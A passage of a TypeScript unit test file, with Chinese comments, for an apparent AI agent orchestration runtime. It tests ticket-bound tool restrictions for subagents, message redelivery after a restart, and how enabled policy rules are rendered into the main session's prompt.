  expect(guards.get('child-1')!()).toBe('Ticket ended; new work needs a new authorized ticket')
  // 另一个会话的子代理保持不变。
  await (controller.create as (options: { sessionId: string }) => Promise<void>)({ sessionId: 'child-2' })
  const other = agents.get('child-2')! as unknown as { session: { header: { parentSession?: string } } }
  other.session.header = { parentSession: 'someone-else' }
  await (runtime as unknown as { ctx: Context }).ctx.parallel('agent/created', { agent: other } as never)
  expect(restricts.get('child-2')).toBeUndefined()
})

it('gives a subagent of a worker\'s subagent the same work tools and guard', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  const create = controller.create as (options: { sessionId: string }) => Promise<void>
  const created = (runtime as unknown as { ctx: Context }).ctx
  for (const [id, parent] of [['child-1', sessionId], ['grandchild-1', 'child-1']] as const) {
    await create({ sessionId: id })
    const agent = agents.get(id)! as unknown as { session: { header: { parentSession?: string } } }
    agent.session.header = { parentSession: parent }
    await created.parallel('agent/created', { agent } as never)
  }
  expect(restricts.get('grandchild-1')).toEqual([{ allow: ['read', 'read_image', 'grep', 'bash', 'job_output', 'job_list', 'job_kill', 'web_search', 'skill'] }])
  runtime.engine.stopTicket(ticket.id)
  expect(guards.get('grandchild-1')!()).toBe('Ticket ended; new work needs a new authorized ticket')
})

it('gives the Assignment a restart starts the messages the replaced one had delivered but no step took, once', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  // 后续消息在回合中途到达 worker，而进程在某个步骤取走它之前停止：DSH 会连同其收件箱一起
  // 处置 worker 的智能体。
  await receive(feishu('2', '另外改一下按钮', { root_id: 'om_1' }))
  const sent = () => deliveries.mock.calls.filter(([call]) => call.sessionId === sessionId && call.text.includes('另外改一下按钮')).length
  expect(sent()).toBe(1)
  const inbox = (agents.get(sessionId)! as unknown as { inbox: { nextTurn: unknown[]; nextStep: unknown[] } }).inbox
  inbox.nextTurn.length = 0; inbox.nextStep.length = 0
  const next = await restart()
  await next.ready; await next.idle()
  expect(next.store.tickets.get(ticket.id)!.assignments.map(item => item.state)).toEqual(['ended', 'running'])
  expect(sent()).toBe(2)
})

it('ends the main Session\'s prompt with its Policy section, each rule on one line, and says orchestrator_eval holds no rules', async () => {
  const settings = runtime.store.settings()
  const rules = settings.policy.rules.map(rule => rule.id === 'copy'
    ? { ...rule, name: 'Copy\nfixes', instruction: 'Fix typos.\n- Keep the tone.\n\n## Not a heading' } : rule)
  await runtime.settings.save('policy', { ...settings.policy, rules }, runtime.store.blockRevision('policy'), 'panel')
  const prompt = (sections.get(runtime.masterId)!.text as (context: object) => string)({})
  const policy = prompt.slice(prompt.indexOf('## 策略'))
  // 该部分之后没有任何内容，其头部之后的行恰好是启用的规则。
  expect(policy.trimEnd().split('\n').slice(2)).toEqual(runtime.store.settings().policy.rules.filter(rule => rule.enabled)
    .map(rule => rule.id === 'copy' ? '- Copy fixes (copy): Fix typos. - Keep the tone. ## Not a heading' : `- ${rule.name} (${rule.id}): ${rule.instruction}`))
  expect(prompt.indexOf('## 策略')).toBeGreaterThan(prompt.indexOf('执行环境'))
  expect((tools.get(runtime.masterId)!.get('orchestrator_eval') as unknown as { description: string }).description).not.toMatch(/rules/)
})

it('keeps the Policy the main Session judges by in its prompt, after admission and the rest, as the latest save left it', async () => {
  const prompt = () => (sections.get(runtime.masterId)!.text as (context: object) => string)({})
  const policy = () => { const text = prompt(), at = text.indexOf('## 策略'); return text.slice(at, text.indexOf('\n\n', at)) }
  const settings = runtime.store.settings()
  const line = (rule: { id: string; name: string; instruction: string }) => `- ${rule.name} (${rule.id}): ${rule.instruction}`
  expect(prompt().indexOf('## 策略')).toBeGreaterThan(prompt().indexOf('你自己依据本提示词末尾策略部分中启用的规则评估主动候选'))
  expect(policy().split('\n').filter(item => item.startsWith('- '))).toEqual(settings.policy.rules.filter(rule => rule.enabled).map(line))
  expect(policy()).toContain(`策略版本 ${policyVersion(settings)}；accept 模式 ${settings.eval.mode}。`)
  // 规则只管辖主动候选；与明确请求一起阅读时，不能把它们当作拒绝该请求。
  expect(policy()).toContain('accept 模式和规则只决定主动候选：明确请求按路由部分所述路由，任何模式下且无论规则如何。')
  // 保存会从下一次请求开始改变它：一条规则被禁用，另一条的指令被更改。
  const rules = settings.policy.rules.map(rule => rule.id === 'copy' ? { ...rule, instruction: `${rule.instruction} Keep it short.` } : { ...rule, enabled: false })
  await runtime.settings.save('policy', { ...settings.policy, rules }, runtime.store.blockRevision('policy'), 'panel')
  const saved = runtime.store.settings()
  expect(policy()).toContain(`策略版本 ${policyVersion(saved)}`)
  expect(policy().split('\n').filter(item => item.startsWith('- '))).toEqual(rules.filter(rule => rule.enabled).map(line))
  // 没有启用任何规则时，主动候选只能被忽略。
  await runtime.settings.save('policy', { ...saved.policy, rules: rules.map(rule => ({ ...rule, enabled: false })) }, runtime.store.blockRevision('policy'), 'panel')
  expect(policy()).toContain('没有启用任何规则：主动候选只能被忽略。')
  expect(policy()).toContain('accept 模式和规则只决定主动候选')
})
